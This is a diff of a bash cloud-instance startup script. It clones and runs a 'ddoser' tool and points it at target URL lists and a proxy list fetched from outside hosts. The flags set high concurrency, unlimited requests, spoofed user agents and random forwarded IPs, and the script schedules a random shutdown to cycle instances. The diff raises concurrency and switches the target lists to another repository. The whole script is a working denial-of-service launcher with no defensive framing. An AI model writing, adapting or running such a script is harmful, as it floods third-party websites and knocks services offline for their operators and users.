@@ -1,14 +1,15 @@
 #!/bin/bash
 set -x 
 sudo systemctl start amazon-ssm-agent
+sudo systemctl start amazon-ssm-agent
 MAX_TIME=20
 MIN_TIME=13
 DIFF=$(($MAX_TIME-$MIN_TIME+1))
 R=$(($(($RANDOM%$DIFF))+$MIN_TIME))
 sudo shutdown +$R
-yum install -y python3-pip git
+yum install -y python3-pip git htop
 ulimit -n 100000
 git clone https://github.com/taransergey/ddoser.git
 cd ddoser/
 pip3 install -r requirements.txt
-python3 ./ddoser.py --concurrency 400 --timeout 60 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --target-urls-file https://raw.githubusercontent.com/romsua/swine/master/swinerus.txt --proxy-url 'http://143.244.166.15/proxy.list' --restart-period 600 --random-xff-ip
+python3 ./ddoser.py --target-urls-file https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt --target-urls-file https://raw.githubusercontent.com/hem017/cytro/master/special_targets.txt --concurrency 500 --timeout 60 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --proxy-url 'http://143.244.166.15/proxy.list' --restart-period 600 --random-xff-ip
